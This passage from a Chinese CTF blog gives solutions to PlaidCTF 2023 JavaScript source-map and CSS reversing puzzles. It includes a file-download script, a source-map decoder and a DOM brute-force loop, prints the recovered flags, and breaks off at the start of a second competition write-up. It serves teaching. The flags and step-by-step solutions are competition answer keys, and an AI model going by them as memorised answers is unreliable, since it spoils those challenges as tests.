x)?.[<span class="number">0</span>] ?? tg.<span class="property">sources</span>.<span class="title function_">slice</span>(-<span class="number">2</span>, -<span class="number">1</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">import</span>(<span class="string">`./<span class="subst">${fl}</span>`</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> x.<span class="title function_">go</span>());</span><br><span class="line">}</span><br><span class="line"><span class="comment">//# sourceMappingURL=121.js.map</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>进入源代码后   代码复制一遍就行</p><p>注意的是 </p><ol><li>moi中fetch中的import改成 <strong>‘./xxx.js ’</strong></li><li>window.buffer = “25个字符”.split(“”), 输入</li></ol><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417170617809.png" alt="image-20230417170617809"></p><p>输入flag</p><p>运用console调试代码</p><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417170748319.png" alt="image-20230417170748319"></p><p>根据gpt哥队这几行的解释  得知  路径要遍历到success.js</p><p>我们可以直接写个js  得到success.js的路径</p><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417170959657.png" alt="image-20230417170959657"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for (let i = 0; i &lt; 200; i++) {</span><br><span class="line">let moi = await fetch(`./${i}.js`).then((x) =&gt; x.text())</span><br><span class="line"></span><br><span class="line">let tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) =&gt; x.json())</span><br><span class="line"></span><br><span class="line">let fl = tg.mappings.split(";").flatMap((v, l) =&gt;v.split(",").filter((x) =&gt; !!x).map((input) =&gt; input.split("").map((x) =&gt; bti.get(x)).reduce((acc, i) =&gt; (i &amp; 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i &amp; 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) =&gt; (acc &lt;&lt; 5) + i, 0)]].map((x) =&gt; typeof x === "number" ? x : x[0] &amp; 0x1 ? (x[0] &gt;&gt;&gt; 1) === 0 ? -0x80000000 : -(x[0] &gt;&gt;&gt; 1) : (x[0] &gt;&gt;&gt; 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) =&gt; [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) =&gt; [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) =&gt; [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) =&gt; x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) =&gt; [tg.sources[s],moi.split("\n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) =&gt; ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("\n").trim()])</span><br><span class="line"></span><br><span class="line">if (fl.filter(([x, _]) =&gt; x === 'success.js').length &gt; 0) {</span><br><span class="line">console.log(fl)</span><br><span class="line">console.log(i)</span><br><span class="line">console.log(fl.filter(([x, _]) =&gt; x === 'success.js'))</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"># 只需要修改两次success.js， 就可以逆回去得到flag</span><br></pre></td></tr></tbody></table></figure><p>然后重复操作（只需要修改两次success.js， 就可以逆回去得到flag）</p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417171221081.png" alt="image-20230417171221081" style="zoom:50%;"><p>得到flag</p><p>Flag: <code>PCTF{Need+a+map/How+about+200!}</code> </p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>开始我是一整个麻的， 全靠chatgpt来得解(我还没学会js Orz)</p><p>我的思路是</p><ol><li><p>flag为长度为25 + 6</p></li><li><p>根据js代码的名称 (为什么有两个0.js) 作为索引  一系列操作</p></li></ol><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/-16817214883581.png" alt="img"></p><p>然后  想错了</p><p>做题  考察的是学习新知识的速度</p><p>这儿更好的思路就是</p><ol><li>先审计一下js代码</li><li>然后控制台快速了解是干嘛的 (这么方便的东西  要好好把握)</li><li>想想如何跳转到success.js（借助console输出 –  <del>脚本小子</del>）</li><li>从后往前逆  得到flag</li></ol><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417165609325.png" alt="image-20230417165609325"></p><h2 id="另外学到的脚本-by-Hur1k"><a href="#另外学到的脚本-by-Hur1k" class="headerlink" title="另外学到的脚本 - by Hur1k"></a>另外学到的脚本 - by Hur1k</h2><p><strong>从url网址获取文件</strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL的前缀和后缀</span></span><br><span class="line">prefix = <span class="string">"http://treasure.chal.pwni.ng/"</span></span><br><span class="line">suffix = <span class="string">".js"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载目录</span></span><br><span class="line">download_dir = <span class="string">"./downloads"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建下载目录</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download_dir):</span><br><span class="line">    os.makedirs(download_dir)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量下载文件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    url = prefix + <span class="built_in">str</span>(i) + suffix</span><br><span class="line">    filename = <span class="built_in">str</span>(i) + suffix</span><br><span class="line">    filepath = os.path.join(download_dir, filename)</span><br><span class="line">    </span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"File <span class="subst">{filename}</span> saved."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"Error: Failed to download <span class="subst">{url}</span>"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><strong>提取每个文件映射表</strong></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b64 = <span class="string">`</span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string">B</span></span><br><span class="line"><span class="string">C</span></span><br><span class="line"><span class="string">D</span></span><br><span class="line"><span class="string">E</span></span><br><span class="line"><span class="string">F</span></span><br><span class="line"><span class="string">G</span></span><br><span class="line"><span class="string">H</span></span><br><span class="line"><span class="string">I</span></span><br><span class="line"><span class="string">J</span></span><br><span class="line"><span class="string">K</span></span><br><span class="line"><span class="string">L</span></span><br><span class="line"><span class="string">M</span></span><br><span class="line"><span class="string">N</span></span><br><span class="line"><span class="string">O</span></span><br><span class="line"><span class="string">P</span></span><br><span class="line"><span class="string">Q</span></span><br><span class="line"><span class="string">R</span></span><br><span class="line"><span class="string">S</span></span><br><span class="line"><span class="string">T</span></span><br><span class="line"><span class="string">U</span></span><br><span class="line"><span class="string">V</span></span><br><span class="line"><span class="string">W</span></span><br><span class="line"><span class="string">X</span></span><br><span class="line"><span class="string">Y</span></span><br><span class="line"><span class="string">Z</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string">f</span></span><br><span class="line"><span class="string">g</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">k</span></span><br><span class="line"><span class="string">l</span></span><br><span class="line"><span class="string">m</span></span><br><span class="line"><span class="string">n</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">p</span></span><br><span class="line"><span class="string">q</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string">u</span></span><br><span class="line"><span class="string">v</span></span><br><span class="line"><span class="string">w</span></span><br><span class="line"><span class="string">x</span></span><br><span class="line"><span class="string">y</span></span><br><span class="line"><span class="string">z</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">4</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">7</span></span><br><span class="line"><span class="string">8</span></span><br><span class="line"><span class="string">9</span></span><br><span class="line"><span class="string">+</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">=`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> bti = b64</span><br><span class="line">    .<span class="title function_">trim</span>()</span><br><span class="line">    .<span class="title function_">split</span>(<span class="string">"\n"</span>)</span><br><span class="line">    .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, x, i</span>) =&gt;</span> (acc.<span class="title function_">set</span>(x, i), acc), <span class="keyword">new</span> <span class="title class_">Map</span>());</span><br><span class="line"><span class="comment">// 读取文件夹中的所有 js.map 文件</span></span><br><span class="line">fs.<span class="title function_">readdir</span>(<span class="string">'E:\\CTF\\PlaidCTF\\Treasure Map'</span>, <span class="function">(<span class="params">err, files</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (err) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 js.map 文件</span></span><br><span class="line">    files.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">extname</span>(file) === <span class="string">'.map'</span>) {  <span class="comment">// 判断文件是否为 js.map 文件</span></span><br><span class="line">            <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(<span class="string">'E:\\CTF\\PlaidCTF\\Treasure Map'</span>, file);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取 js.map 文件并解析为 JSON</span></span><br><span class="line">            fs.<span class="title function_">readFile</span>(filePath, <span class="string">'utf8'</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> {</span><br><span class="line">                <span class="keyword">if</span> (err) {</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(filePath)</span><br><span class="line">                <span class="keyword">const</span> tg = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将 tg 传入函数进行处理</span></span><br><span class="line">                <span class="keyword">const</span> tg_output = <span class="title function_">processTG</span>(tg);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 输出 tg_output 中的最后一个元素的值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(tg_output[tg_output.<span class="property">length</span> - <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (tg_output[tg_output.<span class="property">length</span> - <span class="number">1</span>][<span class="number">1</span>] === <span class="number">201</span>) {</span><br><span class="line">                    <span class="keyword">debugger</span>; <span class="comment">// 下断点</span></span><br><span class="line">                  }</span><br><span class="line">            });</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processTG</span>(<span class="params">tg</span>) {</span><br><span class="line">    <span class="keyword">return</span> tg.<span class="property">mappings</span></span><br><span class="line">    .<span class="title function_">split</span>(<span class="string">";"</span>)</span><br><span class="line">    .<span class="title function_">flatMap</span>(<span class="function">(<span class="params">v, v_Idx</span>) =&gt;</span></span><br><span class="line">      v</span><br><span class="line">        .<span class="title function_">split</span>(<span class="string">","</span>)</span><br><span class="line">        .<span class="title function_">filter</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> !!x) <span class="comment">//只有当 x 不为 falsy 值（即不为 false、null、undefined、0、NaN、空字符串 ''）时才会保留</span></span><br><span class="line">        .<span class="title function_">map</span>(<span class="function">(<span class="params">input</span>) =&gt;</span></span><br><span class="line">          input<span class="comment">//每个又细分了</span></span><br><span class="line">            .<span class="title function_">split</span>(<span class="string">""</span>)</span><br><span class="line">            .<span class="title function_">map</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> bti.<span class="title function_">get</span>(x))<span class="comment">//从上面的映射获取键值对的值</span></span><br><span class="line">            <span class="comment">//得到对应数组</span></span><br><span class="line">            .<span class="title function_">reduce</span>(</span><br><span class="line">              <span class="function">(<span class="params">accumulator, curValue</span>) =&gt;</span></span><br><span class="line">                curValue &amp; <span class="number">32</span></span><br><span class="line">                  ? [...accumulator.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>), [...accumulator.<span class="title function_">slice</span>(-<span class="number">1</span>)[<span class="number">0</span>], curValue &amp; <span class="number">31</span>]] <span class="comment">//大于32则添加value%32</span></span><br><span class="line">                  : [ <span class="comment">//小于32，则accumulator加上 curValue&lt;&lt;5+lastValue</span></span><br><span class="line">                      ...accumulator.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>),</span><br><span class="line">                      [</span><br><span class="line">                        [...accumulator.<span class="title function_">slice</span>(-<span class="number">1</span>)[<span class="number">0</span>], curValue]</span><br><span class="line">                          .<span class="title function_">reverse</span>()</span><br><span class="line">                          .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> (acc &lt;&lt; <span class="number">5</span>) + cur, <span class="number">0</span>)</span><br><span class="line">                      ]</span><br><span class="line">                    ]</span><br><span class="line">              .<span class="title function_">map</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> {</span><br><span class="line">                <span class="comment">// 如果是数值，直接返回</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">typeof</span> x === <span class="string">"number"</span>) {</span><br><span class="line">                  <span class="keyword">return</span> x;</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                  <span class="comment">// 否则根据 x[0] 的值返回相应的结果</span></span><br><span class="line">                  <span class="keyword">if</span> (x[<span class="number">0</span>] &amp; <span class="number">0x1</span>) {</span><br><span class="line">                    <span class="keyword">if</span> (x[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">1</span> === <span class="number">0</span>) {</span><br><span class="line">                      <span class="keyword">return</span> -<span class="number">0x80000000</span>;</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                      <span class="keyword">return</span> -(x[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">                    }</span><br><span class="line">                  } <span class="keyword">else</span> {</span><br><span class="line">                    <span class="keyword">return</span> x[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              })</span><br><span class="line">              .<span class="title function_">concat</span>([[]]),</span><br><span class="line">              [[]]</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>)</span><br><span class="line">        )<span class="comment">//最好记录一下到这里干嘛了</span></span><br><span class="line">        .<span class="title function_">map</span>(<span class="function">(<span class="params">[c, s, ol, oc, n]</span>) =&gt;</span> [v_Idx, c, s ?? <span class="number">0</span>, ol ?? <span class="number">0</span>, oc ?? <span class="number">0</span>, n ?? <span class="number">0</span>])<span class="comment">//如果存在null或undefined就换掉</span></span><br><span class="line">        .<span class="title function_">reduce</span>(</span><br><span class="line">          <span class="function">(<span class="params">acc, cur, curIdx</span>) =&gt;</span> [</span><br><span class="line">            ...acc,</span><br><span class="line">            [v_Idx, cur[<span class="number">1</span>] + (acc[curIdx - <span class="number">1</span>]?.[<span class="number">1</span>] ?? <span class="number">0</span>), ...cur.<span class="title function_">slice</span>(<span class="number">2</span>)]</span><br><span class="line">          ],</span><br><span class="line">          []</span><br><span class="line">        )</span><br><span class="line">    )<span class="comment">//record</span></span><br><span class="line">    .<span class="title function_">reduce</span>(</span><br><span class="line">      <span class="function">(<span class="params">acc, e, i</span>) =&gt;</span> [</span><br><span class="line">        ...acc,</span><br><span class="line">        [</span><br><span class="line">          ...e.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">          ...e.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">x, c</span>) =&gt;</span> x + (acc[i - <span class="number">1</span>]?.[c + <span class="number">2</span>] ?? <span class="number">0</span>))</span><br><span class="line">        ]</span><br><span class="line">      ],</span><br><span class="line">      []</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="CSS-buhui"><a href="#CSS-buhui" class="headerlink" title="CSS - buhui"></a>CSS - buhui</h1><p>收集一下jiaoben</p><p>来自 上面贴的博客</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">let tops = ['0px', '20px', '-380px', '-60px', '40px', '-20px', '-180px', '-80px', '-80px', '-80px', '-40px', '-60px', '-20px', '-240px', '-140px', '-100px', '-20px', '-20px', '-120px', '-160px', '-380px', '20px', '-20px', '-160px', '-200px', '-80px', '-60px', '-60px', '60px', '-140px', '-60px', '-240px', '60px', '-80px', '-180px', '-60px', '40px', '-60px', '-240px', '-60px', '-220px', '40px', '-260px', '0px', '-20px', '-60px', '-120px', '60px', '-240px', '40px', '-60px', '-20px', '40px', '-60px', '20px', '40px']</span><br><span class="line"></span><br><span class="line">for (let n = 0; n &lt; 14; n++) {</span><br><span class="line">    let grandparent = document.children.item(0).children.item(1).children.item(0)</span><br><span class="line">    let parent = grandparent.children.item(8 + n)</span><br><span class="line">    let details = parent.children.item(6)</span><br><span class="line">    let done = false</span><br><span class="line">    for (let i = 0; i &lt; 26; i++) {</span><br><span class="line">        details.children.item(i).open = false</span><br><span class="line">    }</span><br><span class="line">    for (let i = 0; i &lt; 27; i++) {</span><br><span class="line">        for (let j = 26; j &lt; 52; j++) {</span><br><span class="line">            details.children.item(j).open = false</span><br><span class="line">        }</span><br><span class="line">        for (let j = 26; j &lt; 53; j++) {</span><br><span class="line">            for (let k = 52; k &lt; 78; k++) {</span><br><span class="line">                details.children.item(k).open = false</span><br><span class="line">            }</span><br><span class="line">            for (let k = 52; k &lt; 79; k++) {</span><br><span class="line">                if (window.getComputedStyle(details.children.item(78).children.item(0)).top == tops[n * 4 + 0] &amp;&amp; window.getComputedStyle(details.children.item(79).children.item(0)).top == tops[n * 4 + 1] &amp;&amp; window.getComputedStyle(details.children.item(80).children.item(0)).top == tops[n * 4 + 2] &amp;&amp; window.getComputedStyle(details.children.item(81).children.item(0)).top == tops[n * 4 + 3]) {</span><br><span class="line">                    done = true</span><br><span class="line">                    break</span><br><span class="line">                }</span><br><span class="line">                if (k &lt; 78) {</span><br><span class="line">                    details.children.item(k).open = true</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            if (done) {</span><br><span class="line">                break</span><br><span class="line">            }</span><br><span class="line">            if (j &lt; 52) {</span><br><span class="line">                details.children.item(j).open = true</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        if (done) {</span><br><span class="line">            break</span><br><span class="line">        }</span><br><span class="line">        if (i &lt; 26) {</span><br><span class="line">            details.children.item(i).open = true</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417171712974.png" alt="image-20230417171712974"></p><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417171749360.png" alt="image-20230417171749360"></p><p><img src="/2023/04/17/reverse-PlaidCTF2023WP%E5%A4%8D%E7%8E%B0-js%E9%80%86%E5%90%91/image-20230417171951815.png" alt="image-20230417171951815"></p><p>Flag: <code>PCTF{youre_lucky_this_wasnt_a_threesat_instance}</code></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023数字人才挑战赛-永信赛道WP</title>
      <link href="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/"/>
      <url>/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次比赛， 打的挺舒服的</p><p>作为一个逆向手， 数据分析感觉做的很顺， 很爽</p><p> 确实学到了很多东西， 也意识到了很多的不足</p><p>然后的话， 因为和队友没有提前沟通好的原因， 丢了100分就特别难受</p><p><del>我靠</del>  数据安全题（CTF题型）累死累活才做出来 分数时动态的</p><p>而数据分析  <del>思维活跃 随便解</del>  分数却是死的  好烦</p><p>（就是说  比赛时  内部一定要交流好哇~~）</p><p>**一起共勉 加油 ^_^ **</p><h1 id="数据分析题解"><a href="#数据分析题解" class="headerlink" title="数据分析题解"></a>数据分析题解</h1><h2 id="区块链威胁分析-1"><a href="#区块链威胁分析-1" class="headerlink" title="区块链威胁分析.1"></a>区块链威胁分析.1</h2><p>请提交App的Team Identifier。（答案严格区分大小写）</p><p>题目010打开  发现是PK</p><p> 改.zip打开是个 DAFOM.app</p><p>（就是这个app的名字）</p><p>Google搜索相关team ID信息</p><p>这是一篇很好的博客，讲的很到位（<a href="https://blog.csdn.net/liuxiaoxiaobo/article/details/122047015%EF%BC%89">https://blog.csdn.net/liuxiaoxiaobo/article/details/122047015）</a></p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403111340896.png" alt="image-20230403111340896"></p><p>然后随便翻翻文件有个叫DAFOM的 </p><p>在010 打开</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403111358079.png" alt="image-20230403111358079"></p><p><code>W58CYKFH67</code> </p><p>这个 就是 flag</p><h2 id="区块链威胁分析-2"><a 